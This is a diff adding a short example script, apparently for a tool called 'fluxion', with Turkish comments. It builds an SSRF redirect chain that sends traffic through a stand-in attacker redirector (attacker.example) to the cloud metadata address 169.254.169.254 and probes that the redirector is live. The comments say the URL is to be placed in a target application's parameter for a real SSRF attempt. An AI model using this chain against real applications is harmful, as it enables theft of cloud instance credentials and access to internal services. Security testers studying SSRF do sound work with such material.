@@ -1,0 +1,26 @@
+# examples/ssrf_redirect_chain_check.flx
+# Kullanım:
+#   -D redirect_base="https://attacker.example/r?u=" (sonunda = bulunan, hedefe yönlendiren uç)
+#   -D metadata="http://169.254.169.254/latest/meta-data/" (veya istediğin internal hedef)
+#   python -m fluxion -s examples/ssrf_redirect_chain_check.flx -D redirect_base=... -D metadata=...
+
+let redirect_base = redirect_base ?? "https://attacker.example/r?u="
+let target_internal = metadata ?? "http://169.254.169.254/latest/meta-data/"
+
+# Test amaçlı zincir URL’si
+# A.com/fetch = redirect(attacker) -> internal
+# Not: burada sadece zinciri ÜRETİYORUZ ve redirector’ı doğrulamak için bir GET yapıyoruz.
+# Gerçek SSRF denemesinde bu URL'yi hedef uygulamanın paramına koyacaksın.
+let chain_url = join(redirect_base, url_encode(target_internal))
+
+# (Opsiyonel) redirector canlı mı?
+let probe = http_head(chain_url)
+
+echo value=jsonify({
+  "redirect_base": redirect_base,
+  "internal": target_internal,
+  "chain_url": chain_url,
+  "probe": probe
+})
+
+return (probe && probe.status ? probe.status : 0)
